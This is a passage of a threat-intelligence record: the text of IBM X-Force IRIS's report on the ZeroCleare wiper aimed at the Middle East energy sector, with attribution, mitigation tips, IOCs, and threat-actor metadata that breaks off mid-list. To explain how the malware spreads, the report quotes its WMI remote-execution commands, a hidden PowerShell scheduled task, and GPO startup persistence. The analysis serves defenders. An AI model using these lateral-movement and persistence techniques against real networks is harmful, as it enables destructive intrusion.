as $AllDC.\n\n  - For each DC in $AllDC:\n\n`o` Creates DCObject (this is a custom defined object which contains properties and\n\nfunctions to do tasks such as create shared drives/folders, and copy/run the\n\nscript on clients)\n\n`o` Creates shared drive \\\\$DCName\\C$\n\n`o` Creates directory \\\\$DCName\\C$\\Users\\Public\\Public Updates\\\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n`o` Copies itself to \\\\$DCName\\C$\\Users\\Public\\Public Updates\\\n\n`o` Attempts to run the script on the DC in Agent mode with the following\n\ncommand:\n\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $this.DCName -Creden\ntial $Credential -ErrorAction Stop;\n\n  - Where $CMD is:\n\n\nPowerShell.exe -exec bypass -WindowStyle Hidden -file $LocalScriptPath $Args\n\n\n- $LocalScriptPath is:\n\n\nC:\\Users\\Public\\Public Updates\\$SelfScript\n\n\n  - And $Args are:\n\n\"-RunMode\", ('\"{0}\"' -f $RunMode),\n\"-TimeSpan\", ('{0}' -f $TimeSpan),\n\"-MaxThreads\", ('{0}' -f $MaxThreads),\n\"-ClientCheckPort\", ('{0}' -f $ClientCheckPort),\n\"-ClientCheckTimeOut\", ('{0}' -f $ClientCheckTimeOut),\n\"-UserName\", ('\"{0}\"' -f $UserNameCollection.RAW),\n\"-Password\", ('\"{0}\"' -f $PasswordCollection.RAW),\n\"-DECKey\", ('\"{0}\"' -f $DECKey)\n\"-MasterSlave\", \"-AgentMode\",\n\"-DCHostName\", ('\"{0}\"' -f $this.DCName)\n\n  - If above fails it attempts to run instead:\n\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $this.DCName -ErrorAct\nion SilentlyContinue;\n\nOnce it has done this for all systems in $AllDC, the ClientUpdate.ps1 PowerShell script then\nretrieves a list of all non-DC systems using the PowerShell module Get-ADComputer. It filters\nout those already present on its DC list and stores them as variable $AllClient.\n\nNext, the script divides up the client list and assigns portions to each of the initialized domain\ncontroller agents. The agents work to copy and execute the ZeroCleare malware onto each of\ntheir assigned clients.\n\nThere are also functions to keep track of agent workloads and the number of failed and\nsuccessful clients. A client is determined to have failed if the agent cannot connect to it and\ncreate a shared folder on it. As redundancy, a swapping mechanism is in place to pass failed\nclients to another agent to try to infect them. These agents do not appear to check the status\nof the drive wiping malware itself.\n\n**Start-AgentController**\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n  - Generates a ClientUpdateScript from the encrypted data within $UpdateTempContents.\n\nThe sample we analyzed, the script generated was named 'ClientUpdateCore.ps1'.\n\n  - Creates DCObject for supplied DCHostName (itself).\n\n  - Creates a RunspacePool to allow for multithreading and then creates a thread for each\nclient in its assigned client list.\n\n  - For each assigned client, the work thread creates a ClientUpdateObject for the\nspecified client, creates a shared drive on the client \\\\$DNSHostName\\C$, copies the\n\n$ClientUpdateScript to \\\\$DNSHostName\\C$\\Windows\\Temp, and then executes the script\nusing the following:\n\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $this.DNSHostName Credential $Credential -ErrorAction Stop\n\n  - Where $CMD is:\n\n@(\n\"PowerShell.exe\",\n\"-exec\", \"bypass\",\n\"-file\", ('\"{0}\"' -f $this.LocalScriptFilePath),\n\"-TimeSpan\", ('{0}' -f $SCHTimeSpan),\n\"-DCHostName\", ('\"{0}\"' -f $this.DCObject.DCName),\n\"-ClientHostName\", ('\"{0}\"' -f $this.DNSHostName),\n\"-UserName\", ('\"{0}\"' -f $UserName),\n\"-Password\", ('\"{0}\"' -f $Password),\n\"-DECKey\", ('\"{0}\"' -f $DECKey)\n)\n\nThe agent also keeps track of failed and successful clients so it can report back this status to\nthe master.\n\n**Start-MasterController**\n\n- Generates a ClientUpdateScript from the encrypted data within $UpdateTempContents. In\nthe sample we analyzed, the script generated was named ClientUpdateCore.ps1.\n\n- Checks if its own file is running from C:\\Users\\Public\\Public Updates, and if not, it will\nattempt to create the directory and copy itself into that destination.\n\n- Creates scheduled task called 'Optimize Startup' with start time listed as Get-Date + 20\nseconds. This task is designed to rerun itself from the new location. If the task registration\n\nis successful, then the script exits. If it finds the task already present then it uses it as an\nindication that it has already been restarted and continues on.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n- Gets a list of all domain controllers for the current domain as $AllDC\n\n- Gets a list of all non-DC systems as $AllClient\n\n- Loops through the list of DCs and performs the following for each (excluding itself or its\nparent):\n\n  - Creates shared drive \\\\$DNSHostname\\C$\n\n  - Checks if script already exists on the system\n\n  - Creates work folder \\\\$DNSHostname\\C$\\Users\\Public\\Public Updates\\\n\n  - Copies itself to the newly created work folder.\n\n  - Runs the copied script in Master mode as follows:\n\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $this.DCName -Creden\ntial $Credential -ErrorAction Stop\n\nWhere $CMD is:\n\n\"PowerShell.exe\"\n\"-exec\", \"bypass\",\n\"-file\", ('\"{0}\"' -f $this.LocalScriptPath) $Args\n\nAnd $Args are as follows:\n\n\"-RunMode\", ('\"{0}\"' -f $RunMode),\n\"-TimeSpan\", ('{0}' -f $TimeSpan),\n\"-MaxThreads\", ('{0}' -f $MaxThreads),\n\"-ClientCheckPort\", ('{0}' -f $ClientCheckPort),\n\"-ClientCheckTimeOut\", ('{0}' -f $ClientCheckTimeOut),\n\"-UserName\", ('\"{0}\"' -f $UserNameCollection.RAW),\n\"-Password\", ('\"{0}\"' -f $PasswordCollection.RAW),\n\"-DECKey\", ('\"{0}\"' -f $DECKey),\n\"-Master\",\n\"-DCParent\", ('\"{0}\"' -f $SelfDC))\n\n- Once all DCs have been initialized it creates a RunspacePool for multithreading and starts\na thread for each client in $AllClient. The thread does the following for each client:\n\n  - Creates shared drive \\\\$DNSHostName\\C$\n\n  - Attempts to copy the generated ClientUpdateScript to\n\\\\$DNSHostName\\C$\\Windows\\Temp\\UpdateTemp\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n  - Runs copied script with:\n\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $this.DNSHostName -C\nredential $Credential -ErrorAction Stop;\n\n  - Where $CMD is:\n\n(\n\"PowerShell.exe\",\n\"-exec\", \"bypass\",\n\"-file\", ('\"{0}\"' -f $this.LocalScriptFilePath),\n\"-TimeSpan\", ('{0}' -f $SCHTimeSpan),\n\"-DCHostName\", ('\"{0}\"' -f $this.DCObject.DCName),\n\"-ClientHostName\", ('\"{0}\"' -f $this.DNSHostName),\n\"-UserName\", ('\"{0}\"' -f $UserName),\n\"-Password\", ('\"{0}\"' -f $Password),\n\"-DECKey\", ('\"{0}\"' -f $DECKey)\n)\n\n**Extract-Self Function**\n\n  - Creates directory $DataFolderPath (\"$SelfPath\\UpdateTemp\").\n\n  - Decrypts contents of $UpdateTempContents (which is an array of Base64-encoded and\nAES-encrypted data contained within the script) using the supplied $DECKey.\n\n  - Writes decrypted contents to $DataFolderPath.\n\n**Execute-Self Function**\n\n  - Checks if a process named ClientUpdate is already running.\n\n  - If it is not, then checks if system architecture is x86 or x64.\n\n  - Next, starts process $DataFolderPath\\X86\\ClientUpdate.exe or\n$DataFolderPath\\X64\\ClientUpdate.exe depending on the above result.\n\n**Encrypted Data Reveals Additional Copies of Existing Files**\n\nA redundancy mechanism of sorts, or maybe a way to resuscitate deleted malware files, the\nClientUpdate.ps1 script contains a number of AES-encrypted and base64-encoded files stored\nwithin an array called $UpdateTempContents. We decrypted the contents of\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n$UpdateTempContents using the identified key and found that these files all matched samples\nwe encountered previously in this attack, namely.\n\n1. GPOClientUpdateCore.ps1\n2. ClientUpdateCore.ps1\n3. x64\\ClientUpdate.exe\n4. x64\\soy.exe\n5. x86\\ClientUpdate.exe\n6. x86\\elrawdsk.sys\nDrilling into the first script, GPOClientUpdateCore.ps1, we inferred it was used for an UpdateDCGPO function within ClientUpdate.ps1 script. This function applies a group policy object\n(GPO) to the domain controllers[5]. Within this function the script is copied to:\n\n\n\"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\Startup\\ClientUpdateCore.ps1\"\n\n\nIt is then added as a GPO named 'ClietnUpdate' with following parameters:\n\nAdded to \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\psscripts.ini\"\n\"[Startup]\",\n\"0CmdLine=ClientUpdateCore.ps1\"\n('0Parameters=-DECKey \"{0}\"' -f $DECKey),\n\"[Shutdown]\",\n\"0CmdLine=\",\n\"0Parameters=\"\n\nAdded to \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\GPT.ini\"\n\"[General]\",\n\"Version=2\",\n\"displayName=New Group Policy Object\"\n\nThe script GPOClientUpdateCore.ps1 itself performs the following:\n\n  - Creates folder C:\\Windows\\Temp\\UpdateTemp\\\n\n  - Decrypts and extracts the encrypted contents of $UpdateTempContents to the newly\ncreated directory.\n\n  - Checks if system is x86 or x64 and executes the corresponding version of\n\nClientUpdate.exe.\n\nThe contents of this script are generated at runtime by the Generate-ClientController function\nof ClientUpdate.ps1. The generation function should result in the contents of\n$UpdateTempContents as found within ClientUpdate.ps1 that is copied to the next script,\nGPOClientUpdateCore.ps1. However, in the script we analyzed, this did not appear to work and\n\n5 Group Policy provides centralized management and configuration of operating systems, applications, and users' settings in an\nActive Directory environment.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n$UpdateTempContents was empty. It could mean that the extraction and execution portions of\nthis particular script sample failed.\n\nDrilling into the second script, ClientUpdateCore.ps1, we inferred it was used by the Master\nand Agent systems to copy to and execute on target clients. This script does the following:\n\n  - Decrypts and extracts the encrypted contents of $UpdateTempContents to $SelfPath\n\n  - If parameter $IMM (immediate) is set, then it runs Execute-Self function immediately.\n\n  - Otherwise it sleeps for the defined number of seconds and then runs Execute-Self\nfunction.\n\n  - The Execute-Self function first checks if a process called ClientUpdate is already\nrunning. If it is not, then it checks if x86 or x64 and then executes the appropriate\nversion of ClientUpdate.exe.\n\nIn the specific sample provided of ClientUpdateCore.ps1, the generation script appears to\nhave not worked correctly and $UpdateTempContents is empty, meaning that the extraction and\nexecution parts of the function would have failed.\n\n### 1.9 ZeroCleare: A Likely Collaboration Between Iranian State Sponsored\n Groups\n\nX-Force IRIS assesses that the ZeroCleare campaign included compromise and access by\nactors from the ITG13 group and at least one additional group, likely Iran-based threat actors.\nThis assessment is based on ITG13's traditional mission, which has not included executing\ndestructive cyber-attacks in the past, the gap in time between the initial access facilitated by\nITG13, the last stage of the intrusion, as well as the different TTPs observed.\n\nLet’s look at the details of some of the resources used throughout the ZeroCleare attack and\nwhich can connect it with ITG13.\n\nFor initial access, the IP address 193.111.152[.]13, which was associated with ITG13 in recent\nOilrig/APT34 leaks, and as also reported by Palo Alto, was used to scan target networks and\naccess accounts as early as the Fall of 2018.[6] A different Iranian threat actor likely accessed\naccounts from that address in mid-2019 preceding disk wiping operations.\n\nOne of the IP addresses used to access compromised network accounts in mid-2019 was\n194.187.249[.]103, which is adjacent to another IP address, 194.187.249[.]102. That last IP\naddress was used several months prior to the attack by the threat actor Hive0081 (aka\n\n6 https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nxHunt).[7] Additionally, while recent reporting indicates that the Russian threat actor IRIS tracks\nas ITG12 (aka Turla) had access to ITG13 tools and infrastructure potentially during this time\nframe, X-Force IRIS does not believe ITG12 was behind the ZeroCleare attack.[8]\n\nDuring the destructive phase, ITG13 threat actors brute forced passwords to gain access to\nseveral network accounts, which were used to install the China Chopper and Tunna web shells\nafter exploiting a SharePoint vulnerability. X-Force IRIS found an additional web shell named\n\"extension.aspx\", which shared similarities with the ITG13 tool known as\nTWOFACE/SEASHARPEE including the methods that were dynamically called from assembly,\nthe use of AES encryption, as well as single letter variable names.\n\nThe same threat actor also attempted to leverage legitimate remote access software, such as\nTeamViewer, and used an obfuscated version of Mimikatz to collect credentials from\ncompromised servers.\n\nRegarding the ZeroCleare malware itself, while it shares some high-level similarities with\nShamoon v3, specifically in how it used an EldoS RawDisk driver, X-Force IRIS assesses that\nZeroCleare is dissimilar enough in its code and deployment mechanism to be considered\ndistinct from the Shamoon malware family and treated as separate malware.\n\nWhile X-Force IRIS cannot attribute the activity observed during the destructive phase of the\nZeroCleare campaign, we assess that high-level similarities with other Iranian threat actors,\nincluding the reliance on ASPX web shells and compromised VPN accounts, the link to ITG13\nactivity, and the attack aligning with Iranian objectives in the region, make it likely this attack\nwas executed by one or more Iranian threat groups.\n\n### 1.10. A New Destructive Wiper Threat in the Wild\n\nVarious links inferred from examining common TTPs and indicators of compromise as\nmentioned in the previous section make it possible that this wiper variant was built by Iranbased nation state attackers. Recent activity from that sphere includes the “Sakabota”\nbackdoor activity, recently reported by X-Force IRIS, also tied to ITG13 (aka “Oilrig” and\n“APT34”), as well as the Lyceum campaign reported by Dell-EMC SecureWorks. In these\ncampaigns, the top targets were Kuwaiti shipping and transportation organizations.\n\n7 https://exchange.xforce.ibmcloud.com/collection/Suspected-Iranian-Threat-Actor-Campaign-Targeting-Kuwaiti-Entities04abb9338fef57ce9ecdec1c81d73865/reports\n\n8 https://www.us-cert.gov/ncas/current-activity/2019/10/21/nsa-and-ncsc-release-joint-advisory-turla-group-activity\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n### 1.11. Energy Sector in the Crosshairs\n\nNation-state attackers have typically carried out destructive attacks against the energy sector,\nwith historic focus especially oil and gas; however, destructive attacks can target any entity.\nWhy has this sector been finding itself in the crosshairs of such activity?\n\nThe key role oil and gas production and processing play on both the national and global level,\nrepresents a high-value target for state-sponsored adversarial actors. These types of attackers\nmay be tasked with conducting anything from industrial espionage, to cyber kinetic attacks[9]\ndesigned to disrupt the critical infrastructure of rival nations. Depending on the sophistication,\nscale, and frequency of attacks, cyber incidents in this space have the potential to disrupt\ncritical services, damage or destroy highly specialized equipment, and ultimately inflict\ndetrimental cascading effects upon global energy[10] security and industries downstream.[11,] [12]\n\nWhile nation state attacks have been happening more in the past decade, it is since at least\n2012 that Iranian state-sponsored threat actors have been leveraging cyber-attacks to inflict\ndestructive, kinetic effects on their targets.[13] The use of cyber-based weapons in lieu of\nconventional military tactics presents Iran, in this case, with a low-cost, and potentially\nnonattributable means of conducting hostile, and even warlike activity. With attribution to one\nspecific group becoming a challenge nowadays, working under the cyber cloak of anonymity\ncan also allow Iran to evade sanctions and preserve its relations with international players who\nmay support its economic and nuclear energy interests.[ 14]\n\nLooking at the geographical region hit by the ZeroCleare malware, it is not the first time the\nMiddle East has seen destructive attacks target its energy sector. In addition to underpinning\nthe economies of several Gulf nations, the Middle East petrochemical market, for example,\nhosts approximately 64.5% of the world’s proven oil reserves, making it a vital center of global\nenergy architecture.[15, 16] Destructive cyberattacks against energy infrastructure in this arena\ntherefore represent a high-impact threat to both the regional and international markets.\n\n9 https://www.reuters.com/article/us-usa-iran-oil-security/iran-oil-industry-must-be-alert-to-physical-cyber-threats-ministeridUSKBN1WE0IP\n\n10 https://www.cnbc.com/2019/09/21/saudi-aramco-attacks-could-predict-cyber-warfare-from-iran.html\n\n**11** https://www.energy.senate.gov/public/index.cfm/files/serve?File_id=03BA54D2-A59B-43F8-A26D-CD027E675022\n\n**12** https://fas.org/irp/eprint/cyber-strat.pdf\n\n15 https://www.opec.org/opec_web/en/data_graphs/330.htm\n\n15 https://www.opec.org/opec_web/en/data_graphs/330.htm\n\n16 https://publicpolicy.wharton.upenn.edu/live/news/1778-the-political-economy-of-oil-in-the-middle-east/forstudents/blog/news.php\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n### 1.12. Mitigating the Risk Posed by Destructive Malware\n\nWhen it comes to destructive attacks, the critical actions for security teams to take are early\ndetection and escalation and coordinated response to contain and stop the spread. Here are\nsome tips from our team that can help mitigate the risk of destructive malware.\n\n**1.12.1. Use threat intelligence to understand the risk to your organization**\n\nEach threat actor has different motivations, capabilities, and intentions, and threat intelligence\ncan help provide insights that increase the efficacy of an organization’s preparedness and\neventual response to an incident.\n\n**1.12.2. Build effective defense-in-depth**\n\nIncorporate multiple layers of security controls across the entire Cyberattack Preparation and\nExecution Framework.[17]\n\n**Figure 3: X-Force IRIS Cyberattack Preparation and Execution Framework (Source: IBM X-Force)**\n\n**1.12.3. Deploy IAM, limit privileged users, and implement MFA**\n\nIn most attacks, adversarial actors leverage privileged accounts to expand their foothold in\ncompromised networks. Limit the number of those accounts to a minimum and back them up\nwith multi-factor authentication (MFA). Also, don’t allow one accounts to access all systems.\n\n17 “IBM X-Force IRIS Cyberattack Preparation and Execution Frameworks,” IBM X-Force IRIS White Paper, July 2018,\nhttps://securityintelligence.com/media/ibm-x-force-iris-cyberattack-preparation-and-execution-frameworks/.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nDeploy Identity and Access Management (IAM) to apply business-process centric policies to\nwhat your users can access. That way, if their account is compromised, the attacker will have a\nharder time using it for access to other parts of the network.\n\nLeveraging IAM can also help baseline legitimate access and alert security teams when lateral\nmovement could be abusing access to compromised accounts.\n\n**1.12.4. Have backups, test backups, and keep offline backups**\n\nBacking up systems is a foundational best practice, but ensuring the organization has effective\nbackups of critical systems and testing these backups is more important than ever. Being able\nto use backups in recovery can make a significant difference in remediating destructive\nmalware attacks.\n\n**1.12.5. Test your response plans under pressure**\n\nUse of a well-tailored tabletop exercise and a cyber range simulation can help ensure that your\nteams are indeed ready, on both the tactical and strategic levels, to manage a destructive\nmalware incident.\n\nRehearsed response plans require ongoing testing and adjustment, but they allow the IR team\nto carry out plans and be able to implement them effectively when the time comes to respond\nand remediate.\n\nFor emergencies or if your organization is under attack, please call:\n\nX-FORCE EMERGENCY RESPONSE HOTLINE 888-241-9812\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n## Annex: IOCs\n\nThis section contains additional indicators of compromise (IOCs) related to each file and script\nwe analyzed.\n\n**ClientUpdate.exe (x64)**\n\nNotable Strings\n\n\\\\?\\ElRawDisk\nSystem\\CurrentControlSet\\Control\\NetworkProvider\\Order\n{82B5234F-DF61-4638-95D5-341CAD244D19}\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\\??\\c:\n/c soy.exe\nC:\\windows\\system32\\cmd.exe\n\\\\.\\c:\nC:\\Users\\Developer\\source\\repos\\ZeroCleare\\x64\\Release\\zeroclear.pdb\n\n**Soy.exe**\n\nFile System\n\nsaddrv.sys\nelrawdsk.sys\n\nService\n\nName: VBoxDrv\nService Type: Driver\nStart Type: Demand Start\nBinary: $CurrentPath\\elrawdsk.sys\n\nMutex\n\n\nPtición de trabajo\n\n\nNotable Strings\n\nC:\\Users\\[User]\\Desktop\\TDL\\Source\\Furutaka\\output\\x64\\Release\\soy.pdb\nSoftware\\Oracle\\VirtualBox\nThe Magic Word!\nVBoxDrv\n\\Device\nVBoxUSBMon\nVBoxNetAdp\nVBoxNetLwf\n\\saddrv.sys\nPtición de trabajo\nelrawdsk.sys\nI'm 22 and looking for fulltime job!\n\nOther\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\nDevice: \\\\.\\vboxdrv\n\n\n**ClientUpdate.exe (X86)**\n\nNotable Strings\n\n\\\\?\\ElRawDisk\nSystem\\CurrentControlSet\\Control\\NetworkProvider\\Order\n{82B5234F-DF61-4638-95D5-341CAD244D19}\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\\??\\c:\nzeroclear.exe\nelrawdsk.sys\n/u /c sc create soydsk type= kernel start= demand binPath= \"\nC:\\windows\\system32\\cmd.exe\n/u /c sc start soydsk\n\\\\.\\c:\nC:\\Users\\Developer\\source\\repos\\ZeroCeare32\\Release\\zeroclear.pdb\n\n**ClientUpdate.ps1**\n\nFile System\n\nC:\\Users\\Public\\Public Updates\\\nC:\\Windows\\Temp\\UpdateTemp\\\nUpdateTemp\\\nClientUpdate.exe\nSoy.exe\nelrawdsk.sys\nClientUpdateCore.ps1\nGPOClientUpdateCore.ps1\n\nScheduled Task\n\nTask Name: \"Optimize Startup\"\nTrigger: Run once at $CurrentDate + 20 seconds\nDescription: \"This idle task reorganizes the cache files used to display the start menu. It is enabled onl\ny when the cache files are not optimally organized.\"\nAction: PowerShell.exe -exec bypass -WindowStyle Hidden -NoLogo -file $SelfScriptPath $ScriptArgs\n\nGroup Policy Object (GPO)\n\nName: \"ClietnUpdate\"\nTargetName: \"Domain Computers\"\nStartup Script: \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\Startup\\ClientUpdateCor\ne.ps1\"\n\nOther\n\nShared drive: \\\\$Hostname\\C$\nSMB Share: C:\\Public Updates\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n## About IBM X-Force\n\nIBM X-Force studies and monitors the latest threat trends, advising customers and the general\npublic about emerging and critical threats, and delivering security content to help protect IBM\ncustomers. From infrastructure, data and application protection to cloud and managed security\nservices, IBM Security Services has the expertise to help safeguard your critical assets. IBM\nSecurity protects some of the most sophisticated networks in the world and employs some of\nthe best minds in the business.\n\nLearn more at ibm.com/security.\n\n© Copyright IBM Corporation 2019\n\nIBM Security\n75 Binney St\nCambridge, MA 10504\nProduced in the United States of America\n\nFebruary 2019\n\nIBM, the IBM logo, ibm.com, and X-Force are trademarks of International Business Machines\nCorp., registered in many jurisdictions worldwide. Other product and service names might be\ntrademarks of IBM or other companies. A current list of IBM trademarks is available on the\nweb at “Copyright and trademark information” at ibm.com/legal/copytrade.shtml. This\ndocument is current as of the initial date of publication and may be changed by IBM at any\ntime.\n\nNot all offerings are available in every country in which IBM operates.\n\nThe information in this document is provided “as is” without any warranty, express or implied,\nincluding without any warranties of merchantability, fitness for a particular purpose and any\nwarranty or condition of non-infringement. IBM products are warranted according to the terms\nand conditions of the agreements under which they are provided.\n\nIBM Security\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | IRIS-4203|Use or disclosure of data\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.12.04.ZeroCleare/New_Destructive_Wiper_ZeroCleare_Final_.pdf"
    ],
    "report_names": [
        "New_Destructive_Wiper_ZeroCleare_Final_"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cde987a8-c71f-49e2-b761-5b7fa2b4ada6",
            "created_at": "2022-10-25T16:07:23.706646Z",
            "updated_at": "2025-03-27T02:02:09.933918Z",
            "deleted_at": null,
            "main_name": "Hexane",
            "aliases": [
                "ATK 120",
                "Cobalt Lyceum",
                "Lyceum",
                "Operation Out to Sea",
                "Siamesekitten",
                "Yellow Dev 9"
            ],
            "source_name": "ETDA:Hexane",
            "tools": [
                "DanBot",
                "DanDrop",
                "Decrypt-RDCMan.ps1",
                "Get-LAPSP.ps1",
                "James",
                "Milan",
                "kl.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7df240e-6750-4b71-99de-85831b92faa2",
            "created_at": "2022-10-25T15:50:23.859253Z",
            "updated_at": "2025-03-27T02:00:55.546377Z",
            "deleted_at": null,
            "main_name": "HEXANE",
            "aliases": [
                "Lyceum",
                "Siamesekitten",
                "Spirlin"
            ],
            "source_name": "MITRE:HEXANE",
            "tools": [
                "Milan",
                "netstat",
                "BITSAdmin",
                "DnsSystem",
                "DanBot",
                "ipconfig",
                "Mimikatz",
                "Kevin",
                "PoshC2"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
